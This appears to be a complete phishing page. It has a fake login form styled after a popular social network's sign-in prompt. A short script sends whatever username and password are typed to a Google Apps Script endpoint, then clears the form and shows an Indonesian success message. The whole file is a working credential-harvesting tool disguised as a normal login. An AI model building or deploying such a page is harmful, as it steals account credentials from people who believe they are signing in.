<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form name="coba">

        <input placeholder="Phone number, username, or email" type="text" name="username" id="username" required>
        <input placeholder="Password" type="password" name="password" id="password" required>

        <input id="submitButton" type="submit" value="Log In" /><br>

    </form>
</body>
</html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>
<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzsCYgyKmDLQWrKGLSiWMxD_07nhhREwNKydOAi29pEEFuN7raEPL-FG_C9BQTp8-CS/exec'
    const form = document.forms['coba']
    
    form.addEventListener('submit', e => {
        e.preventDefault()
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => $("#form_alerts").html("<div class='alert alert-success'>Data berhasil dikirim.</div>"))
        .catch(error => $("#form_alerts").html("<div class='alert alert-danger'>Data gagal terkirim!.</div>"))
        form.reset();
    })
</script>
